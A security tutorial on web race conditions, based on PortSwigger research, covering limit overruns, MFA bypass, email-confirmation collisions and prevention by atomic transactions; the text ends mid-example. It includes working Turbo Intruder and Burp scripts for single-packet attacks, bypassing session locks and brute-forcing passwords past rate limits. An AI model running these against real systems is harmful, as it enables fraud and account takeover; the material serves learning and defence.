# Race conditions (comprehensive guide)

Based on PortSwigger Web Security Academy and "Smashing the State Machine" research (Black Hat USA 2023)

Race conditions are timing vulnerabilities that occur when applications process concurrent requests without adequate safeguards, allowing multiple threads to interact with the same data simultaneously and cause a "collision" that leads to unintended behavior. Unlike typical web vulnerabilities that exploit code flaws, race conditions exploit the temporal dimension—the precise timing and ordering of operations. When successfully exploited, attackers use carefully synchronized requests to abuse temporary application sub-states, bypass business logic, and achieve impacts ranging from discount code abuse to complete authentication bypass.

The paradigm shift in race condition research: **with race conditions, everything is multi-step**. Every single HTTP request may transition an application through multiple fleeting, hidden states (sub-states) that exist for mere milliseconds before the request completes. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

> Only test systems you own or are explicitly authorized to assess.

## What are race conditions? (fundamentals)

### Core concept: Collisions and sub-states

**Normal sequential processing:**
```
Request 1: Check discount code unused → Apply discount → Mark as used
         [completes]
Request 2: Check discount code unused → BLOCKED (already used)
```

**Race condition exploitation:**
```
Time 0ms:  Request 1: Check discount code unused ✓
Time 0ms:  Request 2: Check discount code unused ✓  (parallel!)
Time 5ms:  Request 1: Apply discount
Time 5ms:  Request 2: Apply discount  (both passed check!)
Time 10ms: Request 1: Mark as used
Time 10ms: Request 2: Mark as used
Result: Discount applied twice
```

### The race window

**Definition:** The brief period during which a collision is possible—often just 1-2 milliseconds. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

**Sub-state example:**
```
State machine for discount code:

[Not applied] ──Request starts──> [Checking...] ──Check passes──> [Applying...] 
                                                                        │
                                                                        ▼
                                [Applied] <──Mark as used── [Discount applied]

The "race window" exists during the [Checking...] → [Applying...] states
```

**Key insight:** Applications transition through temporary sub-states that they enter and exit before request processing completes. [portswigger](https://portswigger.net/web-security/race-conditions)

### Historical challenge: Network jitter

**The problem:**
```
Attacker sends:
Request 1 ────┐
Request 2 ────┤ Intended to arrive simultaneously
Request 3 ────┘

Network reality (with jitter):
Request 1 ─────────────────────> arrives 0ms
Request 2 ───────────────────────> arrives 4ms  (jitter delay)
Request 3 ─────────────────────────> arrives 8ms  (more jitter)

Race window: 1ms
Result: Requests miss the window → attack fails
```

**Network jitter:** Unpredictable delays in TCP packet arrival that prevent precise timing. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

### Breakthrough: Single-packet attack (Black Hat 2023)

**Concept:** Squeeze 20-30 HTTP/2 requests into a single TCP packet, eliminating network jitter entirely. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

**Performance comparison (Melbourne → Dublin, 17,208km):**

| Technique | Median spread | Standard deviation | Effectiveness |
|-----------|---------------|-------------------|---------------|
| Last-byte sync (HTTP/1) | 4ms | 3ms | Baseline |
| Single-packet attack (HTTP/2) | 1ms | 0.3ms | **4-10x better** |

**Real-world impact:** One vulnerability required 30 seconds to exploit with single-packet attack vs. 2+ hours with last-byte sync. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

## Types of race conditions

### Type 1: Limit overrun (classic TOCTOU)

**TOCTOU = Time Of Check to Time Of Use**

**Common scenarios:**
- Redeeming gift card multiple times
- Applying discount code multiple times
- Rating product multiple times
- Withdrawing money exceeding balance
- Reusing single CAPTCHA solution
- Bypassing rate limits (anti-brute-force)

#### Example: Gift card redemption

**Vulnerable code:**
```python
def redeem_gift_card(user_id, card_code):
    # Check if card already redeemed
    card = GiftCard.query.filter_by(code=card_code).first()
    
    if card.redeemed:
        return "Card already redeemed"
    
    # Add credit to user
    user = User.query.get(user_id)
    user.balance += card.value
    db.session.commit()
    
    # Mark card as redeemed
    card.redeemed = True
    db.session.commit()
```

**Race window:** Between checking `card.redeemed` and setting `card.redeemed = True`.

**Exploitation:**
```
Thread 1: Check redeemed=False → Add $100 to balance
Thread 2: Check redeemed=False → Add $100 to balance  (collision!)
Thread 1: Set redeemed=True
Thread 2: Set redeemed=True

Result: $200 added, card value only $100
```

#### Lab walkthrough: Limit overrun race conditions

**Scenario:** E-commerce site with discount code "PROMO20" (20% off, single-use).

**Goal:** Apply discount multiple times.

**Testing with Burp Suite 2023.9+:**

**Step 1: Apply discount normally**
```http
POST /cart/coupon/apply HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

csrf=abc123&coupon=PROMO20
```

**Response:**
```
Discount applied: -$20.00
Total: $80.00
```

**Step 2: Attempt reapplication**
```http
POST /cart/coupon/apply HTTP/2

csrf=abc123&coupon=PROMO20
```

**Response:**
```
Error: Coupon already used
```

**Step 3: Race condition exploitation**

**Burp Repeater:**
1. Send discount application request to Repeater
2. Right-click → "Duplicate tab" (create 20 copies)
3. Select all tabs → Right-click group
4. "Send group (parallel)" ← Uses single-packet attack

**Result:**
```
20 requests sent simultaneously
15 responses: "Discount applied"
5 responses: "Coupon already used"

Final cart total: $0.00  (100% discount + refund!)
```

**Why it works:** All 20 requests checked `coupon.used` before any could update it.

### Type 2: Hidden multi-step sequences

**Paradigm shift:** A single HTTP request can transition through multiple internal states. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

#### Example: MFA bypass via race condition

**Vulnerable login flow:**
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    if not user or not check_password(password):
        return "Invalid credentials"
    
    # Set session user
    session['user_id'] = user.id  # ← Sub-state begins!
    
    # Check MFA
    if user.mfa_enabled:
        session['require_mfa'] = True
        send_mfa_code(user)
        return redirect('/mfa')
    
    return redirect('/dashboard')  # ← Sub-state ends
```

**State machine visualization:**
```
[Logged out] → [Processing login...] → [Logged in (no MFA check yet)] 
                                                      │
                                                      ▼
               [MFA required] ← [MFA check performed]
```

**Race window:** Between `session['user_id'] = user.id` and `session['require_mfa'] = True`.

**Exploitation:**
```
Request 1: POST /login (credentials)
Request 2: GET /admin-panel  (sent in parallel)

Timing:
0ms:  Login request starts processing
1ms:  session['user_id'] = 123 set  ← User authenticated!
2ms:  Admin panel request arrives → session['user_id'] = 123 → Access granted!
3ms:  session['require_mfa'] = True set  ← Too late!

Result: Accessed admin panel without MFA
```

### Type 3: Multi-endpoint race conditions

**Scenario:** Sending requests to different endpoints simultaneously to exploit workflow transitions.

#### Example: E-commerce order manipulation

**Classic vulnerability (without race):**
```
1. Add cheap item ($10) to cart
2. Proceed to checkout
3. Payment validated for $10
4. Add expensive item ($1000) to cart  ← Before confirmation
5. Force-browse to /order/confirm
6. Order confirmed with both items, paid only $10
```

**Race condition variant:**

**Vulnerable code:**
```python
@app.route('/order/process', methods=['POST'])
def process_order():
    cart = get_cart(session['cart_id'])
    payment = validate_payment(cart.total)  # ← Check
    
    if not payment.success:
        return "Payment failed"
    
    # Small delay (database transaction, inventory check)
    time.sleep(0.01)  # 10ms race window
    
    confirm_order(cart)  # ← Use
    return "Order confirmed"
```

**Exploitation:**
```
Request 1: POST /order/process (process $10 order)
Request 2: POST /cart/add (add $1000 item)

Timing:
0ms:  Order processing starts, validates payment for $10
1ms:  Cart add request adds $1000 item  ← Race window!
10ms: Order confirmed with updated cart ($1010 total, paid $10)

Result: Got expensive item for free
```

#### Lab: Multi-endpoint race conditions

**Challenge:** Align race windows when endpoints have different processing times.

**Problem:**
```
POST /order/process:  Takes 50ms to reach vulnerable state
POST /cart/add:       Takes 5ms to complete

Misaligned:
0ms:   Both requests sent
5ms:   Cart updated
50ms:  Order processes (sees updated cart, but too late)
```

**Solution: Connection warming**

```
Send inconsequential request first to establish connection:
GET / HTTP/2  (homepage, warms connection)

Then attack:
POST /order/process  (now faster connection)
POST /cart/add
```

**Burp Repeater technique:**
1. Create tab group with: `GET /`, `POST /order/process`, `POST /cart/add`
2. Send group in sequence (single connection) ← Warms connection
3. Remove `GET /` request
4. Send remaining group in parallel

### Type 4: Single-endpoint race conditions

**Most powerful:** Exploit temporary states within a single endpoint using parallel requests with different parameters.

#### Example: Password reset token collision (inspired by Facebook bug)

**Vulnerable code:**
```python
@app.route('/reset-password', methods=['POST'])
def reset_password():
    email = request.form['email']
    
    # Generate token
    token = generate_random_token()
    
    # Store in session
    session['reset_email'] = email
    session['reset_token'] = token
    
    # Send email (background thread)
    send_email_async(email, token)  # ← Runs separately!
    
    return "Reset email sent"
```

**Exploitation:**
```
Send TWO parallel requests from SAME session:

Request 1: email=attacker@evil.com
Request 2: email=victim@company.com

Parallel execution:
Thread 1: token1 = generate_random_token()  # token1 = "abc123"
Thread 2: token2 = generate_random_token()  # token2 = "xyz789"

Thread 1: session['reset_email'] = 'attacker@evil.com'
Thread 2: session['reset_email'] = 'victim@company.com'  # Overwrites!

Thread 1: session['reset_token'] = 'abc123'
Thread 2: session['reset_token'] = 'xyz789'  # Overwrites!

Thread 1: send_email_async('attacker@evil.com', 'abc123')
Thread 2: send_email_async('victim@company.com', 'xyz789')

Final session state:
session['reset_email'] = 'victim@company.com'
session['reset_token'] = 'xyz789'

Emails sent:
To: attacker@evil.com   Token: abc123 (invalid)
To: victim@company.com  Token: xyz789 (valid)

But wait... sometimes the collision causes:
To: attacker@evil.com  Token: xyz789  ← Attacker receives victim's valid token!
```

**Why:** Email sending happens asynchronously. The `send_email_async` call reads `email` from its parameter but fetches token/confirmation link from the database, creating a race window. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

#### Real-world case study: GitLab CVE-2022-4037

**Discovered by PortSwigger Research, presented at Black Hat USA 2023.**

**Vulnerable flow (GitLab with Devise framework):**
```ruby
# Devise confirmable.rb
def send_confirmation_instructions
  # Store email to confirm
  self.unconfirmed_email = self.email  # From parameter
  self.confirmation_token = Devise.friendly_token
  
  # Queue email to unconfirmed_email
  send_devise_notification(:confirmation_instructions, 
                           @raw_confirmation_token, 
                           { to: unconfirmed_email })
end

# Email template (reads from database)
To: <%= @resource.unconfirmed_email %>
Click: <%= confirmation_url(@resource, token: @token) %>
```

**Race window:** Between queueing email (uses parameter) and rendering template (reads database).

**Exploitation:**
```http
POST /-/profile HTTP/2
user[email]=attacker@evil.com

POST /-/profile HTTP/2
user[email]=victim@company.com
```

**Collision result:**
```
Email 1:
To: victim@company.com  ← Correct recipient
Body: "Please confirm attacker@evil.com"  ← Wrong body!
Token: [valid for attacker@evil.com]

Email 2:
To: attacker@evil.com  ← Correct recipient
Body: "Please confirm victim@company.com"  ← Wrong body!
Token: [valid for victim@company.com]  ← Attacker receives this!
```

**Impact:**
- Confirm email address you don't own
- Hijack pending project invitations
- OpenID account takeover on third-party sites trusting GitLab

**Video proof of concept:** Documented in PortSwigger Research paper. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

### Type 5: Partial construction race conditions

**Concept:** Objects created in multiple steps expose temporary insecure states where fields are uninitialized.

#### Example: API key race condition

**Vulnerable user registration:**
```python
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    email = request.form['email']
    
    # Step 1: Create user
    user = User(username=username, email=email)
    db.session.add(user)
    db.session.commit()  # User exists but api_key = NULL
    
    # Step 2: Generate API key (separate transaction)
    api_key = generate_api_key()
    user.api_key = api_key
    db.session.commit()  # Now api_key is set
    
    return "Registration complete"
```

**Database state during race window:**
```sql
-- After step 1:
SELECT * FROM users WHERE username='victim';
-- Result: {username: 'victim', email: '...', api_key: NULL}

-- After step 2:
SELECT * FROM users WHERE username='victim';
-- Result: {username: 'victim', email: '...', api_key: 'abc123xyz'}
```

**Exploitation using empty array/null injection:**

**PHP parameter handling:**
```php
// Normal request
GET /api/data?api_key=abc123
// PHP: $_GET['api_key'] = 'abc123'

// Array injection
GET /api/data?api_key[]=
// PHP: $_GET['api_key'] = []  (empty array)
```

**Ruby on Rails parameter handling:**
```ruby
# Empty value
GET /api/data?api_key[key]
# Rails: params = {"api_key"=>{"key"=>nil}}
```

**Attack timing:**
```
Thread 1: POST /register (create user 'victim')
Thread 2: GET /api/data?user=victim&api_key[]= (access API)

Timing:
0ms:  Registration starts
1ms:  User created in database (api_key = NULL)
2ms:  API request checks: user.api_key == api_key[]
       NULL == empty_array → True!  ← Bypass!
3ms:  Real api_key generated and saved

Result: Authenticated API access before user even has API key
```

**For passwords (harder):**
```python
# Need hash('') == NULL or hash(some_input) == user.password_hash
# where user.password_hash is uninitialized

# MD5('')  = 'd41d8cd98f00b204e9800998ecf8427e'
# SHA256('') = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'

# Unlikely to match NULL, but some hash functions with null input 
# might return NULL on error
```

#### Lab: Partial construction race conditions

**Challenge:** Exploit user creation race to access API without valid credentials.

**Strategy:**
1. Trigger user registration
2. Simultaneously send API request with empty array parameter
3. Hit narrow window where user exists but security token uninitialized

### Type 6: Session-based locking bypass

**Problem:** Some frameworks lock sessions to prevent race conditions.

**PHP example:**
```php
// PHP native session handler
session_start();  // ← Acquires lock

// Process request...

session_write_close();  // ← Releases lock
```

**Effect:** Requests with same session ID processed sequentially, not concurrently.

**Detection:**
```
Send 10 parallel requests with same session cookie:
Request 1: Processed 0-10ms
Request 2: Processed 10-20ms  ← Sequential!
Request 3: Processed 20-30ms
...

Total time: 100ms (should be 10ms if parallel)
```

**Bypass:** Use different session cookies for each parallel request.

**Exploitation:**
```python
# Burp Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # Create 20 requests with DIFFERENT sessions
    for i in range(20):
        # Each request has unique session
        session_cookie = f"session=attacker_session_{i}"
        request = target.req.replace('Cookie: session=original', 
                                     f'Cookie: {session_cookie}')
        engine.queue(request, gate='1')
    
    engine.openGate('1')
```

### Type 7: Time-sensitive attacks

**Concept:** Timing precision enables attacks on weak randomness (even without race conditions).

#### Example: Timestamp-based token collision

**Vulnerable token generation:**
```python
import time

def generate_reset_token():
    timestamp = int(time.time() * 1000)  # Milliseconds
    return hashlib.md5(str(timestamp).encode()).hexdigest()

@app.route('/reset-password', methods=['POST'])
def reset_password(email):
    token = generate_reset_token()
    # Send token to email...
```

**Weakness:** If two users request reset at same millisecond, they get same token!

**Exploitation:**
```
Send parallel password reset requests:
Request 1: email=attacker@evil.com
Request 2: email=victim@company.com

If both execute at timestamp 1634567890123:
Token 1: md5('1634567890123') = 'abc123...'
Token 2: md5('1634567890123') = 'abc123...'  ← Same!

Attacker receives token in their email.
Token also valid for victim's reset!
```

#### Lab: Exploiting time-sensitive vulnerabilities

**Scenario:** Reset tokens use `timestamp + username` for generation.

**Strategy:**
1. Send simultaneous resets for your account and victim's account
2. Tokens generated: `md5(timestamp + 'attacker')` and `md5(timestamp + 'victim')`
3. If timestamps identical, try both tokens on victim account
4. One will work!

## PortSwigger methodology for finding race conditions

**From "Smashing the State Machine" whitepaper.** [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

### Phase 1: Predict potential collisions

**Goal:** Identify endpoints worth testing (don't test everything).

**Key questions:**

**1) Is this endpoint security-critical?**
```
High priority:
- Authentication (login, MFA, password reset)
- Authorization (role changes, permissions)
- Financial (payments, refunds, transfers)
- Rate-limited operations (attempts, submissions)

Low priority:
- Static content retrieval
- Analytics logging
- Non-sensitive data queries
```

**2) Is there collision potential?**
```
Look for endpoints that EDIT existing data:

Good collision potential:
POST /change-email → Edits user.email (same record)
POST /apply-discount → Edits cart.total (same cart)
POST /password-reset → Edits user.reset_token (same user)

Poor collision potential:
POST /add-comment → Appends new comment (new record)
POST /create-post → Creates new post (no collision)
```

**3) What's the storage key?**
```
Storage keyed by user ID:
POST /reset?user_id=123 → Edits users table WHERE id=123
POST /reset?user_id=456 → Edits users table WHERE id=456
No collision (different keys)

Storage keyed by session ID:
POST /reset?email=attacker@evil.com → Edits session[token]
POST /reset?email=victim@company.com → Edits session[token]  
COLLISION! (same session = same key)
```

### Phase 2: Probe for clues

**Step 1: Benchmark normal behavior**

**Burp Repeater:**
1. Create multiple identical requests (or varied parameters)
2. Group tabs
3. "Send group in sequence (separate connections)"
4. Record baseline: response codes, timing, content, emails received

**Example baseline:**
```
Request 1: 200 OK, 150ms, "Success", 1 email
Request 2: 200 OK, 150ms, "Success", 1 email
Request 3: 200 OK, 150ms, "Success", 1 email
Total: 450ms, 3 emails
```

**Step 2: Send in parallel (single-packet attack)**

**Burp Repeater:**
1. Same grouped tabs
2. "Send group (parallel)"
3. Compare to baseline

**Example parallel results:**
```
Request 1: 200 OK, 50ms, "Success"
Request 2: 200 OK, 50ms, "Success"
Request 3: 500 Error, 50ms, "Internal error"  ← CLUE!
Total: 50ms, 2 emails  ← CLUE! (expected 3)
```

**Step 3: Analyze clues**

**Any deviation is a clue:** [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

**Direct clues (response changes):**
- Different status codes (500, 404, 403)
- Different response content ("already used", "error", different data)
- Different response timing (faster or slower)
- Different headers

**Second-order clues (side effects):**
- Wrong number of emails received
- Email sent to wrong address
- Email contains wrong data (mismatched token/address)
- Application state changed incorrectly (user profile, cart, session)
- Database inconsistencies (audit logs show unexpected data)

**Timing clues:**
```
Faster than expected:
- Suggests async processing (email sent in background)
- Indicates deferred operations (batch processing)

Slower than expected:
- May indicate locking mechanism
- Could be rate limiting kicking in
```

### Phase 3: Prove the concept

**Step 1: Minimize attack**
```
Start with: 20 parallel requests
Reduce to: 2 requests (if possible)

Benefits:
- Easier to understand what's happening
- More reliable exploitation
- Cleaner logs for demonstration
```

**Step 2: Understand the root cause**
```
Why did collision occur?
- What sub-states exist?
- What data is shared?
- What's the exact timing?

Draw the state machine:
[State A] → [Sub-state] → [State B]
              ↑
         Race window here
```

**Step 3: Automate if needed**
```python
# Turbo Intruder script for repeated attempts
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # Retry 100 times for reliability
    for attempt in range(100):
        engine.queue(target.req.replace('PARAM', 'value1'), gate=str(attempt))
        engine.queue(target.req.replace('PARAM', 'value2'), gate=str(attempt))
        engine.openGate(str(attempt))
        
        # Check for success, exit if found
```

**Step 4: Escalate impact**
```
Don't stop at proof of concept!

Found discount code reuse?
→ Can you drain company funds?

Found email confirmation bypass?
→ Can you hijack admin accounts?

Found session collision?
→ Can you force session on victim?

Think of race conditions as structural weaknesses,
not isolated bugs [web:193]
```

## Exploitation techniques with Burp Suite

### Using Burp Repeater (simplest)

**Step 1: Prepare requests**
```
1. Send vulnerable request to Repeater
2. Right-click tab → "Duplicate tab" (20 times)
3. Modify parameters in each tab if needed
```

**Example - discount code abuse:**
```
Tab 1: POST /apply-coupon  coupon=PROMO20
Tab 2: POST /apply-coupon  coupon=PROMO20
Tab 3: POST /apply-coupon  coupon=PROMO20
...
Tab 20: POST /apply-coupon  coupon=PROMO20
```

**Example - password reset collision:**
```
Tab 1: POST /reset  email=attacker@evil.com
Tab 2: POST /reset  email=victim@company.com
```

**Step 2: Group tabs**
```
1. Select all tabs (Shift+click)
2. Right-click → "Create tab group"
```

**Step 3: Send in parallel**
```
1. Right-click tab group
2. "Send group (parallel)"
   - HTTP/2: Uses single-packet attack
   - HTTP/1: Uses last-byte sync
```

**Step 4: Analyze results**
```
Look for:
- Different status codes in responses
- Different response content
- Timing anomalies
- Check application state (cart, balance, profile)
- Check email inbox
```

### Using Turbo Intruder (advanced)

**Installation:**
```
1. Burp → Extender → BApp Store
2. Search "Turbo Intruder"
3. Install
```

**Basic single-packet attack:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2  # HTTP/2 single-packet attack
    )
    
    # Queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # Send all in parallel
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Usage:**
```
1. Right-click request in Burp
2. "Extensions" → "Turbo Intruder" → "Send to Turbo Intruder"
3. Select "race-single-packet-attack.py" template
4. Click "Attack"
```

**Advanced: Parameter variation**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # Vary email parameter
    engine.queue(target.req.replace('EMAIL', 'attacker@evil.com'), gate='1')
    engine.queue(target.req.replace('EMAIL', 'victim@company.com'), gate='1')
    
    engine.openGate('1')
```

**Advanced: Retry with timing detection**
```python
import time

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    for attempt in range(100):  # 100 attempts
        # Queue attack requests
        engine.queue(target.req.replace('PARAM', 'value1'), gate=str(attempt))
        engine.queue(target.req.replace('PARAM', 'value2'), gate=str(attempt))
        
        # Send
        engine.openGate(str(attempt))
        
        time.sleep(0.1)  # Brief delay between attempts

def handleResponse(req, interesting):
    # Check for success indicators
    if 'Admin panel' in req.response:
        print("SUCCESS!")
    table.add(req)
```

### Overcoming timing challenges

**Problem 1: Endpoints have different processing times**

```
POST /validate-payment:  100ms processing time
POST /add-to-cart:       10ms processing time

Misalignment:
0ms:   Both sent
10ms:  Cart updated
100ms: Payment validated (too late to see cart update)
```

**Solution 1: Connection warming**
```python
# Burp Repeater
1. Add GET / request to start of tab group
2. "Send group in sequence (single connection)"
3. This warms the connection
4. Remove GET / request
5. "Send group (parallel)" for attack
```

**Solution 2: Abuse rate limiting (force server-side delay)**
```python
# Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # Send 100 dummy requests to trigger rate limit
    for i in range(100):
        engine.queue(target.req, gate='dummy')
    engine.openGate('dummy')
    
    # Now server is rate-limiting
    # Send actual attack (will be delayed server-side)
    engine.queue(target.req.replace('PARAM', 'value1'), gate='attack')
    engine.queue(target.req.replace('PARAM', 'value2'), gate='attack')
    engine.openGate('attack')
```

**Result:** Server delays processing of attack requests, aligning race windows.

**Problem 2: Session locking (PHP)**

**Detection:**
```
Send 5 parallel requests with same session:
Timing: 100ms, 200ms, 300ms, 400ms, 500ms
→ Sequential processing (locked)
```

**Solution:**
```python
# Use different session for each request
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    for i in range(20):
        # Replace session cookie with unique value
        req = target.req.replace('session=abc123', f'session=session_{i}')
        engine.queue(req, gate='1')
    
    engine.openGate('1')
```

## Real-world case studies

### Case study 1: GitLab email confirmation bypass (CVE-2022-4037)

**Discovered:** PortSwigger Research, August 2023
**Severity:** High (email verification bypass → account takeover)
**Bounty:** Disclosed in research paper

**Vulnerability:** Devise framework (Rails authentication library) had race condition in email confirmation.

**Technical details:**
```ruby
# Simplified Devise code
self.unconfirmed_email = params[:email]  # Store new email
self.confirmation_token = generate_token()

# Send email in background thread
send_email(to: unconfirmed_email, token: confirmation_token)
```

**Race window:** Email recipient determined from parameter, but email body template reads from database.

**Exploitation:**
```http
POST /-/profile HTTP/2
Host: gitlab.com
Cookie: session=attacker_session

user[email]=attacker@evil.com
```

```http
POST /-/profile HTTP/2
Host: gitlab.com
Cookie: session=attacker_session

user[email]=victim@gitlab.com
```

**Collision:**
```
Thread 1: unconfirmed_email = 'attacker@evil.com'
Thread 2: unconfirmed_email = 'victim@gitlab.com'  (overwrites!)

Thread 1: Email queued to attacker@evil.com
Thread 2: Email queued to victim@gitlab.com

Template rendering (reads from DB):
Email 1 body: "Confirm victim@gitlab.com" (read from DB)
Email 2 body: "Confirm attacker@evil.com" (read from DB)

Result:
To: attacker@evil.com
Body: "Confirm victim@gitlab.com [valid token]"
```

**Impact:**
- Verify email you don't own
- Hijack pending project invitations to that email
- OpenID account takeover on external sites trusting GitLab

**Fix:** GitLab 15.7.2 (January 4, 2023)

### Case study 2: Major website deferred collision

**Target:** Unnamed major website (disclosure withheld)
**Type:** Deferred race condition

**Discovery:**
```
Normal behavior:
POST /change-email email=new@example.com
→ Confirmation sent to new@example.com

Parallel test:
POST /change-email email=address1@example.com
POST /change-email email=address2@example.com
→ Two emails, both sent to address2@example.com  ← Clue!
```

**Key insight:** Requests could be sent **20 minutes apart** and still collide!

**Reason:** Email sending happened in periodic batch job, not immediately.

```
Time-based collision:
10:00 AM: Request 1: email=address1@example.com (queued)
10:20 AM: Request 2: email=address2@example.com (queued)
10:30 AM: Batch job runs, processes both (collision occurs)
```

**Exploitation:** Same as GitLab—attacker receives victim's confirmation token.

**Lesson:** Race conditions aren't always about precise millisecond timing. Batch processing creates inherent race windows. [goa2023.nullcon](https://goa2023.nullcon.net/doc/goa-2023/Smashing-the-State-Machine-The-True-Potential-of-Web-Race-Conditions.pdf)

### Case study 3: Bank account overdraft

**Scenario:** Online banking app

**Vulnerable code:**
```python
@app.route('/transfer', methods=['POST'])
def transfer_money():
    amount = request.form['amount']
    recipient = request.form['recipient']
    
    sender_account = Account.query.get(session['account_id'])
    
    # Check balance
    if sender_account.balance < amount:
        return "Insufficient funds"
    
    # Deduct from sender
    sender_account.balance -= amount
    db.session.commit()
    
    # Add to recipient
    recipient_account = Account.query.filter_by(number=recipient).first()
    recipient_account.balance += amount
    db.session.commit()
```

**Exploitation:**
```
Initial balance: $100

Send 5 parallel transfers of $100 to attacker's account:

Thread 1: Check balance=$100 ✓ → Deduct $100
Thread 2: Check balance=$100 ✓ → Deduct $100  (balance still $100 when checked!)
Thread 3: Check balance=$100 ✓ → Deduct $100
Thread 4: Check balance=$100 ✓ → Deduct $100
Thread 5: Check balance=$100 ✓ → Deduct $100

Final sender balance: -$400
Final recipient balance: +$500

Attacker gained $400 from nothing!
```

### Case study 4: Rate limit bypass (authentication)

**Scenario:** Login endpoint with rate limiting (5 attempts per minute).

**Vulnerable rate limit implementation:**
```python
def check_rate_limit(username):
    attempts = get_attempts(username)
    
    if attempts >= 5:
        return "Rate limit exceeded"
    
    increment_attempts(username)
    return "OK"

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Check rate limit
    rate_status = check_rate_limit(username)
    if rate_status != "OK":
        return rate_status
    
    # Verify credentials
    if verify_password(username, password):
        return "Login successful"
    else:
        return "Invalid credentials"
```

**Race window:** Between `if attempts >= 5` and `increment_attempts()`.

**Exploitation with Turbo Intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # Send 100 login attempts with different passwords
    for password in wordlists.passwords:
        request = target.req.replace('password=PASSWORD', f'password={password}')
        engine.queue(request, gate='bruteforce')
    
    # Send all at once
    engine.openGate('bruteforce')

def handleResponse(req, interesting):
    if 'Login successful' in req.response:
        print(f"PASSWORD FOUND: {req.getParam('password')}")
    table.add(req)
```

**Result:** All 100 requests pass rate limit check (all see `attempts < 5`), enabling brute force.

#### Lab: Bypassing rate limits via race conditions

**Scenario:** Login protected by 3-attempt rate limit.

**Goal:** Brute force password despite rate limit.

**Strategy:**
1. Identify rate limit (3 failed attempts → 60-second lockout)
2. Prepare 20 login requests with different passwords
3. Send all 20 in parallel using single-packet attack
4. All pass rate limit check simultaneously
5. Find correct password

## Prevention strategies

**From PortSwigger Research  and Web Security Academy.** [portswigger](https://portswigger.net/web-security/race-conditions)

### Strategy 1: Eliminate sub-states (atomic operations)

**Bad - Multiple operations:**
```python
# Check
if coupon_used(code):
    return "Already used"

# Use
apply_discount(code)

# Update
mark_coupon_used(code)

# 3 separate operations = 2 race windows!
```

**Good - Single atomic transaction:**
```python
# Everything in one database transaction
with db.transaction():
    coupon = Coupon.query.with_for_update().filter_by(code=code).first()
    
    if coupon.used:
        raise Exception("Already used")
    
    apply_discount(coupon)
    coupon.used = True
    db.session.commit()

# with_for_update() acquires row lock
# Entire operation is atomic
```

**SQL equivalent:**
```sql
BEGIN TRANSACTION;

-- Lock row
SELECT * FROM coupons WHERE code = 'PROMO20' FOR UPDATE;

-- Check and update atomically
UPDATE coupons 
SET used = TRUE, applied_at = NOW() 
WHERE code = 'PROMO20' AND used = FALSE;

-- If 0 rows updated, coupon already used
COMMIT;
```

### Strategy 2: Use database constraints

**Bad - Application-level check:**
```python
def redeem_gift_card(card_code):
    card = GiftCard.query.filter_by(code=card_code).first()
    
    if card.redeemed:
        return "Already redeemed"
    
    card.redeemed = True
    db.session.commit()
```

**Good - Database constraint:**
```sql
CREATE TABLE gift_card_redemptions (
    user_id INTEGER,
    card_code VARCHAR(50),
    redeemed_at TIMESTAMP,
    UNIQUE(card_code)  -- Prevents duplicate redemptions
);

-- Application code
INSERT INTO gift_card_redemptions (user_id, card_code, redeemed_at)
VALUES (123, 'GIFT123', NOW());
-- Second concurrent insert will fail with unique constraint violation
```

**Better - Optimistic locking with version:**
```python
class GiftCard(db.Model):
    code = db.Column(db.String(50), unique=True)
    balance = db.Column(db.Numeric)
    version = db.Column(db.Integer, default=0)  # Version number

def redeem_gift_card(card_code):
    card = GiftCard.query.filter_by(code=card_code).first()
    original_version = card.version
    
    if card.redeemed:
